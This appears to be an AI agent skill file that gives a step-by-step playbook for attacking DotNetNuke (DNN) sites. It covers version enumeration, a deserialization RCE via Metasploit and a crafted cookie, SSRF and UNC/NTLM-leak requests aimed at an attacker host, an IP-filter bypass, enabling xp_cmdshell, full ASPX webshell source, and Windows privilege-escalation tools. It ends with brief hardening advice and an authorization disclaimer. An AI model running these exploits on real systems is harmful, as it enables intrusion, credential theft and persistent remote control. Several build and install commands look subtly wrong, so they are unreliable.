---
name: dnn-pentest
description: Pentest DotNetNuke (DNN) installations for vulnerabilities including unauthenticated RCE, SSRF, NTLM hash exposure, and IP filter bypass. Use this skill whenever the user mentions DNN, DotNetNuke, .NET CMS, or needs to assess DNN security, enumerate versions, test for CVE-2017-9822, CVE-2025-32372, CVE-2025-52488, or CVE-2025-52487, or harden DNN installations. Trigger for any DNN-related security assessment, penetration test, or vulnerability research.
---

# DotNetNuke (DNN) Pentesting Skill

A comprehensive guide for assessing DotNetNuke (DNN) installations for security vulnerabilities, from enumeration through exploitation to hardening.

## Quick Start

```bash
# Enumerate DNN version
./scripts/enumerate-dnn.sh <target-url>

# Craft malicious cookie for deserialization RCE
python3 ./scripts/craft-dnn-cookie.py --gadget <gadget-name> --lhost <attacker-ip>

# Test SSRF vulnerability
python3 ./scripts/test-ssrf.py <target-url> <callback-server>
```

## 1. Version & Environment Enumeration

### Check HTTP Headers

The `X-DNN` response header often discloses the exact platform version:

```bash
curl -I https://target.com | grep -i x-dnn
```

### Check Installation Wizard (Old Installs)

Very old installations may leak version via the install wizard:

```bash
curl https://target.com/Install/Install.aspx?mode=install
```

### API Status Endpoint (9.x+)

For DNN 9.x, the API endpoint returns version info for low-privilege users:

```bash
curl https://target.com/API/PersonaBar/GetStatus | jq '.dnnVersion'
```

### Inspect Cookies

Look for these cookies in responses:

- `.DOTNETNUKE` - ASP.NET forms authentication ticket
- `DNNPersonalization` - Contains XML/serialized user profile data (potential RCE vector in old versions)

```bash
curl -c cookies.txt https://target.com
cat cookies.txt | grep -E "DOTNETNUKE|DNNPersonalization"
```

## 2. Unauthenticated Exploitation

### CVE-2017-9822: Cookie Deserialization RCE

**Affected:** DNN ≤ 9.3.0-RC

The `DNNPersonalization` cookie is deserialized on every request when the 404 handler is enabled. Crafted XML can trigger gadget chains for arbitrary code execution.

**Using Metasploit:**

```bash
msfconsole
use exploit/windows/http/dnn_cookie_deserialization_rce
set RHOSTS <target>
set LHOST <attacker_ip>
run
```

The module handles patched but still vulnerable versions (CVE-2018-15811/15812/18325/18326).

**Manual Exploitation:**

Use the cookie crafting script:

```bash
python3 ./scripts/craft-dnn-cookie.py --gadget ObjectDeserialization --lhost 10.0.0.1 --lport 4444
```

This generates a malicious `DNNPersonalization` cookie. Send it with requests:

```bash
curl -H "Cookie: DNNPersonalization=<malicious-cookie>" https://target.com
```

**Works:**
- Unauthenticated on 7.x–9.1.x
- With low-privilege account on 9.2.x+

### CVE-2025-32372: SSRF via RemoteContentProxy

**Affected:** DNN < 9.13.8 (patched April 2025)

A bypass of the `DnnImageHandler` fix allows semi-blind SSRF via the `RemoteContentProxy` API.

**Proof of Concept:**

```bash
# Start a listener
nc -lvnp 8080

# Trigger SSRF
curl "https://target.com/API/RemoteContentProxy?url=http://attacker:8080/poc"
```

**Use Cases:**
- Internal port scanning
- Cloud metadata service discovery (`http://169.254.169.254/latest/meta-data/`)
- Accessing internal hosts behind firewalls

**Script:**

```bash
python3 ./scripts/test-ssrf.py https://target.com http://attacker:8080
```

### CVE-2025-52488: NTLM Hash Exposure via UNC Redirect

**Affected:** DNN 6.0.0 – 9.x (< 10.0.1)

Specially crafted content triggers DNN to fetch resources via UNC paths, causing Windows NTLM negotiation and hash leakage.

**Setup Responder:**

```bash
# Install Responder
pip3 install responder

# Start capture
Responder -I <interface> -w
```

**Trigger:**

```bash
curl "https://target.com/some-endpoint?img=\\\\attacker\\share\\image.png"
```

**Mitigation:** Upgrade to 10.0.1+ or block outbound SMB (ports 445/139).

### CVE-2025-52487: IP Filter Bypass

**Affected:** DNN < 10.0.1

Host/IP Filters on the admin portal can be bypassed via `X-Forwarded-For` manipulation in reverse-proxy scenarios.

**Test:**

```bash
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
```

## 3. Post-Authentication to RCE

### Via SQL Console

If you have admin access:

1. Navigate to **Settings → SQL**
2. Execute the following to enable `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
xp_cmdshell 'whoami';
```

### Via ASPX Webshell Upload

1. Go to **Settings → Security → More → More Security Settings**
2. Add `aspx` (or `asp`) to **Allowable File Extensions**
3. Save settings
4. Navigate to **/admin/file-management**
5. Upload a webshell (e.g., `shell.aspx`)
6. Access at **/Portals/0/shell.aspx**

**Basic ASPX Webshell:**

```aspx
<%@ Page Language="C#" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd)) {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            Response.Write(p.StandardOutput.ReadToEnd());
        }
    }
</script>
```

## 4. Privilege Escalation on Windows

After gaining code execution as `IIS AppPool<Site>`:

### SeImpersonatePrivilege Abuse

```bash
# PrintSpoofer
git clone https://github.com/BeichenDream/PrintSpoofer
cd PrintSpoofer && make
./PrintSpoofer

# SpoolFool
git clone https://github.com/antonioCoco/SpoolFool
cd SpoolFool && make
./SpoolFool.exe
```

### Service Account Escalation

```bash
# JuicyPotato
git clone https://github.com/ohpe/juicy-potato
cd juicy-potato && make
./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "-c whoami"

# SharpPotatoes
git clone https://github.com/CCob/SharpPotatoes
dotnet run --project SharpPotatoes.csproj
```

## 5. Hardening Recommendations (Blue Team)

### Immediate Actions

1. **Upgrade** to at least 9.13.9 (SSRF fix) or preferably 10.0.1+ (IP filter & NTLM fixes)
2. **Remove** `InstallWizard.aspx` and related files after installation
3. **Disable** outbound SMB (ports 445/139) at the firewall
4. **Enforce** Host Filters on the edge proxy, not within DNN
5. **Block** `/API/RemoteContentProxy` if not needed

### Ongoing Maintenance

- Monitor for `X-DNN` header leaks
- Regularly audit `Allowable File Extensions` in security settings
- Keep DNN and all modules updated
- Implement network segmentation for DNN backend
- Enable logging for `/admin/*` and `/API/*` endpoints

## 6. References

- Metasploit `dnn_cookie_deserialization_rce` module
- GitHub Security Advisory GHSA-3f7v-qx94-666m (2025 SSRF bypass)
- CVE-2017-9822, CVE-2018-15811, CVE-2018-15812, CVE-2018-18325, CVE-2018-18326
- CVE-2025-32372, CVE-2025-52487, CVE-2025-52488

## Safety & Ethics

This skill is for authorized security assessments only. Always obtain written permission before testing any system. Unauthorized access to computer systems is illegal and unethical.
